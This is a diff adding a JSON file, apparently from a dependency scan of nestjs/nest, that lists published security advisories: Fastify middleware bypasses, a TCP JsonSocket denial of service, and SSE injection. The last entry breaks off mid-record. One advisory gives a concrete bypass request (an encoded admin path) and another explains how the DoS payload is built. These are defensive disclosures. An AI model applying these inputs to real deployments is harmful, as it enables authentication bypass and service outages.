@@ -1,0 +1,850 @@
+{
+  "status": "READY",
+  "tool": "Dependabot",
+  "strategy": "Security White-box Testing",
+  "category": "Dependency Risk (SCA)",
+  "metrics_total": 1,
+  "metrics_covered": 1,
+  "target_repository": "nestjs/nest",
+  "api_endpoint": "GET /repos/nestjs/nest/security-advisories",
+  "dependabot_config": {
+    "dependabot_yml_present": true,
+    "npm_ecosystem_configured": true,
+    "sample_subject_monitored": true,
+    "schedule_interval": "daily"
+  },
+  "security_advisories": [
+    {
+      "ghsa_id": "GHSA-6v32-fjc9-9qf6",
+      "cve_id": "CVE-2026-54281",
+      "url": "https://api.github.com/repos/nestjs/nest/security-advisories/GHSA-6v32-fjc9-9qf6",
+      "html_url": "https://github.com/nestjs/nest/security/advisories/GHSA-6v32-fjc9-9qf6",
+      "summary": "Middleware Bypass on Fastify via Trailing Slash",
+      "description": "### Impact\r\n\r\nAn authentication bypass vulnerability exists in `@nestjs/platform-fastify` (confirmed on version `11.1.24`, the latest available release at time of report). When middleware is registered through NestJS's `MiddlewareConsumer.forRoutes()` API on the Fastify adapter, an unauthenticated client can bypass the Nest middleware registered for that route by simply appending a trailing slash (`/`) to the request URL.\r\n\r\nThis bypass works on the **default Fastify adapter configuration** — no special router options need to be enabled. Applications using the standard CRUD route shape (`GET /resource` and `GET /resource/:id`) are affected when they protect those routes with `MiddlewareConsumer.forRoutes()` middleware.\r\n\r\n### Patches\r\n\r\nFixed in `@nestjs/platform-fastify@11.1.24`\r\n\r\n### References\r\n\r\nKudos goes to @a-tt-om\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "kamilmysliwiec",
+        "id": 23244943,
+        "node_id": "MDQ6VXNlcjIzMjQ0OTQz",
+        "avatar_url": "https://avatars.githubusercontent.com/u/23244943?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/kamilmysliwiec",
+        "html_url": "https://github.com/kamilmysliwiec",
+        "followers_url": "https://api.github.com/users/kamilmysliwiec/followers",
+        "following_url": "https://api.github.com/users/kamilmysliwiec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/kamilmysliwiec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/kamilmysliwiec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/kamilmysliwiec/subscriptions",
+        "organizations_url": "https://api.github.com/users/kamilmysliwiec/orgs",
+        "repos_url": "https://api.github.com/users/kamilmysliwiec/repos",
+        "events_url": "https://api.github.com/users/kamilmysliwiec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/kamilmysliwiec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-6v32-fjc9-9qf6",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-54281",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-06-12T18:42:02Z",
+      "published_at": "2026-06-08T07:44:18Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "",
+            "name": "@nestjs/platform-fastify"
+          },
+          "vulnerable_version_range": "<= 11.1.23",
+          "patched_versions": "11.1.24",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-863",
+          "name": "Incorrect Authorization"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-863"
+      ],
+      "credits": [
+        {
+          "login": "a-tt-om",
+          "type": "reporter"
+        },
+        {
+          "login": "kamilmysliwiec",
+          "type": "remediation_developer"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "a-tt-om",
+            "id": 92680067,
+            "node_id": "U_kgDOBYYvgw",
+            "avatar_url": "https://avatars.githubusercontent.com/u/92680067?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/a-tt-om",
+            "html_url": "https://github.com/a-tt-om",
+            "followers_url": "https://api.github.com/users/a-tt-om/followers",
+            "following_url": "https://api.github.com/users/a-tt-om/following{/other_user}",
+            "gists_url": "https://api.github.com/users/a-tt-om/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/a-tt-om/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/a-tt-om/subscriptions",
+            "organizations_url": "https://api.github.com/users/a-tt-om/orgs",
+            "repos_url": "https://api.github.com/users/a-tt-om/repos",
+            "events_url": "https://api.github.com/users/a-tt-om/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/a-tt-om/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter",
+          "state": "accepted"
+        },
+        {
+          "user": {
+            "login": "kamilmysliwiec",
+            "id": 23244943,
+            "node_id": "MDQ6VXNlcjIzMjQ0OTQz",
+            "avatar_url": "https://avatars.githubusercontent.com/u/23244943?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/kamilmysliwiec",
+            "html_url": "https://github.com/kamilmysliwiec",
+            "followers_url": "https://api.github.com/users/kamilmysliwiec/followers",
+            "following_url": "https://api.github.com/users/kamilmysliwiec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/kamilmysliwiec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/kamilmysliwiec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/kamilmysliwiec/subscriptions",
+            "organizations_url": "https://api.github.com/users/kamilmysliwiec/orgs",
+            "repos_url": "https://api.github.com/users/kamilmysliwiec/repos",
+            "events_url": "https://api.github.com/users/kamilmysliwiec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/kamilmysliwiec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "remediation_developer",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-hpwf-8g29-85qm",
+      "cve_id": "CVE-2026-40879",
+      "url": "https://api.github.com/repos/nestjs/nest/security-advisories/GHSA-hpwf-8g29-85qm",
+      "html_url": "https://github.com/nestjs/nest/security/advisories/GHSA-hpwf-8g29-85qm",
+      "summary": " DoS via Recursive handleData in JsonSocket (TCP Transport)",
+      "description": "### Impact\r\nAttacker sends many small, valid JSON messages in one TCP frame\r\n → handleData() recurses once per message; buffer shrinks each call\r\n → maxBufferSize is never reached; call stack overflows instead\r\n → A ~47 KB payload is sufficient to trigger RangeError\r\n\r\n### Patches\r\n\r\nFixed in `@nestjs/microservices@11.1.19`\r\n\r\n### References\r\n\r\nDiscovered by https://github.com/hwpark6804-gif",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "kamilmysliwiec",
+        "id": 23244943,
+        "node_id": "MDQ6VXNlcjIzMjQ0OTQz",
+        "avatar_url": "https://avatars.githubusercontent.com/u/23244943?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/kamilmysliwiec",
+        "html_url": "https://github.com/kamilmysliwiec",
+        "followers_url": "https://api.github.com/users/kamilmysliwiec/followers",
+        "following_url": "https://api.github.com/users/kamilmysliwiec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/kamilmysliwiec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/kamilmysliwiec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/kamilmysliwiec/subscriptions",
+        "organizations_url": "https://api.github.com/users/kamilmysliwiec/orgs",
+        "repos_url": "https://api.github.com/users/kamilmysliwiec/repos",
+        "events_url": "https://api.github.com/users/kamilmysliwiec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/kamilmysliwiec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-hpwf-8g29-85qm",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-40879",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-04-15T16:48:17Z",
+      "published_at": "2026-04-13T08:02:15Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "@nestjs/microservices"
+          },
+          "vulnerable_version_range": "<= 11.1.18",
+          "patched_versions": "11.1.19",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [],
+      "cwe_ids": [],
+      "credits": [
+        {
+          "login": "hwpark6804-gif",
+          "type": "finder"
+        },
+        {
+          "login": "kamilmysliwiec",
+          "type": "remediation_developer"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "hwpark6804-gif",
+            "id": 230949332,
+            "node_id": "U_kgDODcQB1A",
+            "avatar_url": "https://avatars.githubusercontent.com/u/230949332?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/hwpark6804-gif",
+            "html_url": "https://github.com/hwpark6804-gif",
+            "followers_url": "https://api.github.com/users/hwpark6804-gif/followers",
+            "following_url": "https://api.github.com/users/hwpark6804-gif/following{/other_user}",
+            "gists_url": "https://api.github.com/users/hwpark6804-gif/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/hwpark6804-gif/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/hwpark6804-gif/subscriptions",
+            "organizations_url": "https://api.github.com/users/hwpark6804-gif/orgs",
+            "repos_url": "https://api.github.com/users/hwpark6804-gif/repos",
+            "events_url": "https://api.github.com/users/hwpark6804-gif/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/hwpark6804-gif/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        },
+        {
+          "user": {
+            "login": "kamilmysliwiec",
+            "id": 23244943,
+            "node_id": "MDQ6VXNlcjIzMjQ0OTQz",
+            "avatar_url": "https://avatars.githubusercontent.com/u/23244943?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/kamilmysliwiec",
+            "html_url": "https://github.com/kamilmysliwiec",
+            "followers_url": "https://api.github.com/users/kamilmysliwiec/followers",
+            "following_url": "https://api.github.com/users/kamilmysliwiec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/kamilmysliwiec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/kamilmysliwiec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/kamilmysliwiec/subscriptions",
+            "organizations_url": "https://api.github.com/users/kamilmysliwiec/orgs",
+            "repos_url": "https://api.github.com/users/kamilmysliwiec/repos",
+            "events_url": "https://api.github.com/users/kamilmysliwiec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/kamilmysliwiec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "remediation_developer",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      }
+    },
+    {
+      "ghsa_id": "GHSA-36xv-jgw5-4q75",
+      "cve_id": "CVE-2026-35515",
+      "url": "https://api.github.com/repos/nestjs/nest/security-advisories/GHSA-36xv-jgw5-4q75",
+      "html_url": "https://github.com/nestjs/nest/security/advisories/GHSA-36xv-jgw5-4q75",
+      "summary": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') in @nestjs/core",
+      "description": "### Impact\r\n_What kind of vulnerability is it? Who is impacted?_\r\n\r\n[`SseStream._transform()`](https://github.com/nestjs/nest/blob/dea5279ef8fcb568de158003e4281759a2cd7675/packages/core/router/sse-stream.ts) interpolates `message.type` and `message.id` directly into Server-Sent Events text protocol output without sanitizing newline characters (`\\r`, `\\n`). Since the SSE protocol treats both `\\r` and `\\n` as field delimiters and `\\n\\n` as event boundaries, an attacker who can influence these fields through upstream data sources can inject arbitrary SSE events, spoof event types, and corrupt reconnection state. Spring Framework's own security patch ([6e97587](https://github.com/spring-projects/spring-framework/commit/6e9758700a4946be1dca85ca937ef2603e291301)) validates these same fields (`id`, `event`) for the same reason.\r\n\r\nActual impact:\r\n\r\n- **Event spoofing**: Attacker forges SSE events with arbitrary `event:` types, causing client-side `EventSource.addEventListener()` callbacks to fire for wrong event types.\r\n- **Data injection**: Attacker injects arbitrary `data:` payloads, potentially triggering XSS if the client renders SSE data as HTML without sanitization.\r\n- **Reconnection corruption**: Attacker injects `id:` fields, corrupting the `Last-Event-ID` header on reconnection, causing the client to miss or replay events.\r\n- **Attack precondition**: Requires the developer to map user-influenced data to the `type` or `id` fields of SSE messages. Direct HTTP request input does not reach these fields without developer code bridging the gap.\r\n-\r\n### Patches\r\n_Has the problem been patched? What versions should users upgrade to?_\r\n\r\nPatched in `@nestjs/core@11.1.18`\r\n",
+      "severity": "medium",
+      "author": null,
+      "publisher": {
+        "login": "kamilmysliwiec",
+        "id": 23244943,
+        "node_id": "MDQ6VXNlcjIzMjQ0OTQz",
+        "avatar_url": "https://avatars.githubusercontent.com/u/23244943?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/kamilmysliwiec",
+        "html_url": "https://github.com/kamilmysliwiec",
+        "followers_url": "https://api.github.com/users/kamilmysliwiec/followers",
+        "following_url": "https://api.github.com/users/kamilmysliwiec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/kamilmysliwiec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/kamilmysliwiec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/kamilmysliwiec/subscriptions",
+        "organizations_url": "https://api.github.com/users/kamilmysliwiec/orgs",
+        "repos_url": "https://api.github.com/users/kamilmysliwiec/repos",
+        "events_url": "https://api.github.com/users/kamilmysliwiec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/kamilmysliwiec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-36xv-jgw5-4q75",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-35515",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-04-03T20:37:41Z",
+      "published_at": "2026-04-03T09:50:43Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "@nestjs/core"
+          },
+          "vulnerable_version_range": "=< 11.1.17 ",
+          "patched_versions": "11.1.18",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-74",
+          "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-74"
+      ],
+      "credits": [
+        {
+          "login": "aleister1102",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "aleister1102",
+            "id": 78531303,
+            "node_id": "MDQ6VXNlcjc4NTMxMzAz",
+            "avatar_url": "https://avatars.githubusercontent.com/u/78531303?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/aleister1102",
+            "html_url": "https://github.com/aleister1102",
+            "followers_url": "https://api.github.com/users/aleister1102/followers",
+            "following_url": "https://api.github.com/users/aleister1102/following{/other_user}",
+            "gists_url": "https://api.github.com/users/aleister1102/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/aleister1102/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/aleister1102/subscriptions",
+            "organizations_url": "https://api.github.com/users/aleister1102/orgs",
+            "repos_url": "https://api.github.com/users/aleister1102/repos",
+            "events_url": "https://api.github.com/users/aleister1102/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/aleister1102/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-wf42-42fg-fg84",
+      "cve_id": "CVE-2026-33011",
+      "url": "https://api.github.com/repos/nestjs/nest/security-advisories/GHSA-wf42-42fg-fg84",
+      "html_url": "https://github.com/nestjs/nest/security/advisories/GHSA-wf42-42fg-fg84",
+      "summary": "Fastify HEAD Request Middleware Bypass",
+      "description": "### Impact\r\n\r\nIn a NestJS application using `@nestjs/platform-fastify`, GET middleware can be bypassed because Fastify automatically redirects HEAD requests to the corresponding GET handlers (if they exist).\r\n\r\nAs a result:\r\n\r\n- Middleware will be completely skipped.\r\n- The HTTP response won't include a body (since the response is truncated when redirecting a HEAD request to a GET handler).\r\n- The actual handler will still be executed.\r\n\r\n### Patches\r\n\r\nFixed in `@nestjs/platform-fastify@11.1.16`\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "kamilmysliwiec",
+        "id": 23244943,
+        "node_id": "MDQ6VXNlcjIzMjQ0OTQz",
+        "avatar_url": "https://avatars.githubusercontent.com/u/23244943?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/kamilmysliwiec",
+        "html_url": "https://github.com/kamilmysliwiec",
+        "followers_url": "https://api.github.com/users/kamilmysliwiec/followers",
+        "following_url": "https://api.github.com/users/kamilmysliwiec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/kamilmysliwiec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/kamilmysliwiec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/kamilmysliwiec/subscriptions",
+        "organizations_url": "https://api.github.com/users/kamilmysliwiec/orgs",
+        "repos_url": "https://api.github.com/users/kamilmysliwiec/repos",
+        "events_url": "https://api.github.com/users/kamilmysliwiec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/kamilmysliwiec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-wf42-42fg-fg84",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-33011",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-03-17T18:20:58Z",
+      "published_at": "2026-03-16T10:46:55Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "@nestjs/platform-fastify"
+          },
+          "vulnerable_version_range": "<= 11.1.15",
+          "patched_versions": "11.1.16",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [],
+      "cwe_ids": [],
+      "credits": [
+        {
+          "login": "kamilmysliwiec",
+          "type": "remediation_developer"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "kamilmysliwiec",
+            "id": 23244943,
+            "node_id": "MDQ6VXNlcjIzMjQ0OTQz",
+            "avatar_url": "https://avatars.githubusercontent.com/u/23244943?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/kamilmysliwiec",
+            "html_url": "https://github.com/kamilmysliwiec",
+            "followers_url": "https://api.github.com/users/kamilmysliwiec/followers",
+            "following_url": "https://api.github.com/users/kamilmysliwiec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/kamilmysliwiec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/kamilmysliwiec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/kamilmysliwiec/subscriptions",
+            "organizations_url": "https://api.github.com/users/kamilmysliwiec/orgs",
+            "repos_url": "https://api.github.com/users/kamilmysliwiec/repos",
+            "events_url": "https://api.github.com/users/kamilmysliwiec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/kamilmysliwiec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "remediation_developer",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-r4wm-x892-vjmx",
+      "cve_id": "CVE-2026-2293",
+      "url": "https://api.github.com/repos/nestjs/nest/security-advisories/GHSA-r4wm-x892-vjmx",
+      "html_url": "https://github.com/nestjs/nest/security/advisories/GHSA-r4wm-x892-vjmx",
+      "summary": "Fastify URL Encoding Middleware Bypass ",
+      "description": "### Impact\r\n_What kind of vulnerability is it? Who is impacted?_\r\n\r\nA NestJS application using `@nestjs/platform-fastify` can allow bypass of any middleware when Fastify path-normalization options (e.g., `ignoreTrailingSlash`, `ignoreDuplicateSlashes`, `useSemicolonDelimiter`) are enabled. In affected route-scoped middleware setups, variant paths may skip middleware checks while still reaching the protected handler.\r\n\r\nThe bug is a path canonicalization mismatch between middleware matching and route matching in Nest’s Fastify adapter.\r\n\r\nNest passes Fastify routerOptions (such as `ignoreTrailingSlash`, `ignoreDuplicateSlashes`, `useSemicolonDelimiter`) to the Fastify router in packages/platform-fastify/adapters/fastify-adapter.ts:253.\r\n\r\nBut middleware execution is decided by a separate regex check over `req.originalUrl` in packages/platform-fastify/adapters/fastify-adapter.ts:706 and packages/platform-fastify/adapters/fastify-adapter.ts:713.\r\n\r\nIf that regex does not match, Nest does `next()` and skips the middleware (packages/platform-fastify/adapters/fastify-adapter.ts:714), while Fastify may still normalize the same path and route it to the protected handler. So the vulnerability exists because security checks (middleware) and request dispatch(router) use different URL interpretations.\r\n\r\nThis is a fail-open design issue (inconsistent normalization), not just a bad app config: non-default router options make the mismatch reachable.\r\n\r\n### Patches\r\n\r\nFixed in `@nestjs/platform-fastify@11.1.14`\r\n\r\n### References\r\n\r\nCredit goes to Fluidattacks ([Cristian Vargas](https://www.linkedin.com/in/cvmiracle/)) https://fluidattacks.com/advisories/neton",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "kamilmysliwiec",
+        "id": 23244943,
+        "node_id": "MDQ6VXNlcjIzMjQ0OTQz",
+        "avatar_url": "https://avatars.githubusercontent.com/u/23244943?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/kamilmysliwiec",
+        "html_url": "https://github.com/kamilmysliwiec",
+        "followers_url": "https://api.github.com/users/kamilmysliwiec/followers",
+        "following_url": "https://api.github.com/users/kamilmysliwiec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/kamilmysliwiec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/kamilmysliwiec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/kamilmysliwiec/subscriptions",
+        "organizations_url": "https://api.github.com/users/kamilmysliwiec/orgs",
+        "repos_url": "https://api.github.com/users/kamilmysliwiec/repos",
+        "events_url": "https://api.github.com/users/kamilmysliwiec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/kamilmysliwiec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-r4wm-x892-vjmx",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-2293",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-02-28T12:27:22Z",
+      "published_at": "2026-02-28T12:27:22Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "@nestjs/platform-fastify"
+          },
+          "vulnerable_version_range": "<= 11.1.13",
+          "patched_versions": "11.1.14",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [],
+      "cwe_ids": [],
+      "credits": [],
+      "credits_detailed": [],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-8wpr-639p-ccrj",
+      "cve_id": "CVE-2025-69211",
+      "url": "https://api.github.com/repos/nestjs/nest/security-advisories/GHSA-8wpr-639p-ccrj",
+      "html_url": "https://github.com/nestjs/nest/security/advisories/GHSA-8wpr-639p-ccrj",
+      "summary": "Fastify URL Encoding Middleware Bypass (TOCTOU) ",
+      "description": "A NestJS application is vulnerable if it meets all of the following criteria:\r\n\r\n1. Platform: Uses `@nestjs/platform-fastify`.\r\n2. Security Mechanism: Relies on `NestMiddleware` (via `MiddlewareConsumer`) for security checks (authentication, authorization, etc.), or through `app.use()`\r\n3. Routing: Applies middleware to specific routes using string paths or controllers (e.g., `.forRoutes('admin')`).\r\nExample Vulnerable Config:\r\n\r\n```ts\r\n// app.module.ts\r\nexport class AppModule implements NestModule {\r\n  configure(consumer: MiddlewareConsumer) {\r\n    consumer\r\n      .apply(AuthMiddleware) // Security check\r\n      .forRoutes('admin');   // Vulnerable: Path-based restriction\r\n  }\r\n}\r\n```\r\n\r\nAttack Vector:\r\n\r\n- Target Route: `/admin`\r\n- Middleware Path: `admin`\r\n- Attack Request: `GET /%61dmin`\r\n- Result: Middleware is skipped (no match on `%61dmin`), but controller for `/admin` is executed.\r\n\r\nConsequences:\r\n\r\n- Authentication Bypass: Unauthenticated users can access protected routes.\r\n- Authorization Bypass: Restricted administrative endpoints become accessible to lower-privileged users.\r\n- Input Validation Bypass: Middleware performing sanitization or validation can be skipped.\r\n\r\n### Patches\r\n\r\nPatched in `@nestjs/platform-fastify@11.1.11`\r\n\r\n### References\r\n\r\nCredit goes to Hacktron AI for reporting this issue.",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "kamilmysliwiec",
+        "id": 23244943,
+        "node_id": "MDQ6VXNlcjIzMjQ0OTQz",
+        "avatar_url": "https://avatars.githubusercontent.com/u/23244943?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/kamilmysliwiec",
+        "html_url": "https://github.com/kamilmysliwiec",
+        "followers_url": "https://api.github.com/users/kamilmysliwiec/followers",
+        "following_url": "https://api.github.com/users/kamilmysliwiec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/kamilmysliwiec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/kamilmysliwiec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/kamilmysliwiec/subscriptions",
+        "organizations_url": "https://api.github.com/users/kamilmysliwiec/orgs",
+        "repos_url": "https://api.github.com/users/kamilmysliwiec/repos",
+        "events_url": "https://api.github.com/users/kamilmysliwiec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/kamilmysliwiec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-8wpr-639p-ccrj",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2025-69211",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2025-12-29T15:02:12Z",
+      "published_at": "2025-12-29T14:37:29Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "@nestjs/platform-fastify"
+          },
+          "vulnerable_version_range": "< 11.1.10",
+          "patched_versions": "11.1.11",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-367",
+          "name": "Time-of-check Time-of-use (TOCTOU) Race Condition"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-367"
+      ],
+      "credits": [],
+      "credits_detailed": [],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-85cg-cmq5-qjm7",
+      "cve_id": "CVE-2025-54782",
+      "url": "https://api.github.com/repos/nestjs/nest/security-advisories/GHSA-85cg-cmq5-qjm7",
+      "html_url": "https://github.com/nestjs/nest/security/advisories/GHSA-85cg-cmq5-qjm7",
+      "summary": "@nestjs/devtools-integration: CSRF to Sandbox Escape Allows for RCE against JS Developers",
